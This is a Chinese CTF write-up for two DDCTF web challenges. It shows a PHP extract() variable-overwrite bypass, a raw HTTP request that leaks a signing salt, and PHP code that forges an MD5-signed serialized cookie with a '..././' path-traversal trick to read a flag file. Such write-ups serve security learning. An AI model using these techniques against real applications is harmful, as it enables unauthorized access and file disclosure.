# 滴

读取index.php得到index.php

读取117.51.150.246/practice.txt.swp得到f1ag!ddctf.php：

```php
<?php
include('config.php');
$k = 'hello';
extract($_GET);
if(isset($uid))
{
    $content=trim(file_get_contents($k));
    if($uid==$content)
	{
		echo $flag;
	}
	else
	{
		echo'hello';
	}
}

?>
```

读取`117.51.150.246/f1ag!ddctf.php?uid=&$k`得到

DDCTF{436f6e67726174756c6174696f6e73}

# 签到

访问/app/Session.php，nickname=%s获取盐

```http
POST /app/Session.php HTTP/1.1
Host: 117.51.158.44
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: ddctf_id=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%227dd47eb6d8d0cf602073d75b1fbda47d%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A13%3A%22210.140.66.56%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A108%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F67.0.3377.1+Safari%2F537.36%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Db621b44aea9340344be7b66bdb959ed0
Connection: close
didictf_username: admin
Content-Length: 11
Content-Type: application/x-www-form-urlencoded

nickname=%s
```

反序列化Application拿flag：

```php
<?php
Class Application {
    var $path = '../config/flag.txt';
}
$eancrykey='EzblrbNS';
$app=new Application();
$app->path=str_replace('../','..././',$app->path);
$cookiedata = serialize($app);
$cookiedata = $cookiedata.md5($eancrykey.$cookiedata);
echo urlencode($cookiedata);
?>
```



